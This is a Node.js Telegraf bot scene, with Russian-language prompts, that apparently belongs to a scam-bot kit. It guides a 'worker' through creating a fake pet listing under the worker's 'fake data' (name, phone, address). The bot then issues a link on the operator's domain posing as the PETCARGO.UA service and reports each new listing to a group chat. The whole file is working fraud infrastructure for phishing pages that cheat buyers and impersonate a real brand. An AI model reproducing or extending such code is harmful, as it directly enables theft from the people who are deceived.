const { Scenes } = require("telegraf");
const { sequelize, Sequelize } = require("../../db");
const { User, Ad, Settings } = require("../../db");
const Wizard = Scenes.WizardScene;

async function rand(min, max) {
    return Math.floor(Math.random() * (max - min + 1) + min);
}
const scene = new Wizard(
  "petcargoua",
  async (ctx) => {
    try {
        const user = await User.findOne({
            where: {
              userid: ctx.from.id,
            },
            });

        if (user.ban == 0) {
          if (user.fio) {
            const keyboard = JSON.stringify({
                inline_keyboard: [
                  [
                    {
                        text: "✖ Отменить",
                        callback_data: `cancel`,
                    },
                  ],
                ],
              });

            await ctx.replyWithHTML('<b>🌄 Введите название животного</b>', {reply_markup: keyboard});
            return ctx.wizard.next();

        } else {
          await ctx.replyWithHTML('<b>❌ У вас не установлены данные фейка! ❌\n\n<code>⚙️ Настройки  ➔ 👱‍♂️ Данные фейков</code></b>');  
          return ctx.scene.leave()
}
        }
    } catch (err) {
        console.log(err)
        return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
        if (!ctx.message?.text) return ctx.scene.leave();
        ctx.scene.state.title = ctx.message.text
        const user = await User.findOne({
            where: {
              userid: ctx.from.id,
            },
            });

        if (user.ban == 0) {
          if (user.fio) {
            const keyboard = JSON.stringify({
                inline_keyboard: [
                  [
                    {
                        text: "✖ Отменить",
                        callback_data: `cancel`,
                    },
                  ],
                ],
              });

            await ctx.replyWithHTML('<b>💵 Введите стоимость животного</b>', {reply_markup: keyboard});
            return ctx.wizard.next();

        } else {
            await ctx.replyWithHTML('<b>❌ У вас не установлены данные фейка! ❌\n\n<code>⚙️ Настройки  ➔ 👱‍♂️ Данные фейков</code></b>');  
            return ctx.scene.leave()
}
        }
    } catch (err) {
        console.log(err)
        return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
        if (!ctx.message?.text) return ctx.scene.leave();
        ctx.scene.state.amount = ctx.message.text
        const user = await User.findOne({
            where: {
              userid: ctx.from.id,
            },
            });

        if (user.ban == 0) {
          if (user.fio) {
            const keyboard = JSON.stringify({
                inline_keyboard: [
                  [
                    {
                        text: "✖ Отменить",
                        callback_data: `cancel`,
                    },
                  ],
                ],
              });

            await ctx.replyWithHTML('<b>⚖️ Введите вес животного <code>(пример: 4.2 кг)</code></b>', {reply_markup: keyboard});
            return ctx.wizard.next();

        } else {
            await ctx.replyWithHTML('<b>❌ У вас не установлены данные фейка! ❌\n\n<code>⚙️ Настройки  ➔ 👱‍♂️ Данные фейков</code></b>');  
            return ctx.scene.leave()
}
        }
    } catch (err) {
        console.log(err)
        return ctx.scene.leave();
    }
  },
  async (ctx) => {
    const settings = await Settings.findOne({
      where: {
        id: 1,
      },
    });
    try {
      
        const adid = parseInt(Math.floor(Math.random() * (99999999 - 999999 + 1) + 999999) + new Date().getTime() / 10000);
        if (!ctx.message?.text) return ctx.scene.leave();

          const user = await User.findOne({
            where: {
              userid: ctx.from.id,
            },
            });

            await Ad.create({
                adid: adid,
                title: ctx.scene.state.title,
                price: ctx.scene.state.amount,
                img: ctx.message.text,
                worker: ctx.from.id,
                fio: user.fio,
                number: user.number,
                address: user.address,
                service: 'petcargoua',
                });
    
                let domain = settings.domain;

                if (user.pro) {
                  if (user.usepro) {
                    domain = settings.domainpro;
                  }
                }

              await ctx.replyWithHTML(`<b>❕Создано объявление PERCARGO.UA
◾️Название животного:<code>${ctx.scene.state.title}</code>
◾️Стоимость животного: <code>${ctx.scene.state.amount}</code>
◾️ID товара: <code>${adid}</code>
➕ Ссылка на объявление: <code>https://${domain}/${adid}</code></b>`, {
                parse_mode: "HTML",
                reply_markup: JSON.stringify({
                  inline_keyboard: [
                    [
                      {
                        text: "💵 Изменить стоимость",
                        callback_data: `changecost_${adid}`,
                      },
                    ],
                  ],
                }),
              })
              await ctx.telegram.sendMessage(
                  '-4243153976',
                  `<b>@${ctx.from.username} создал объявление №${adid} (СЕРВИС PETCARGO.UA)</b>`,
                  {
                    parse_mode: "HTML",
                    disable_web_page_preview: true,
                  }
                );

      return ctx.scene.leave();
    } catch (err) {
        console.log(err)
        ctx.reply("❌ Произошла непредвиденная ошибка, сообщите администрации").catch((err) => err);
        return ctx.scene.leave();
    }
  }
);

scene.leave();

module.exports = scene;
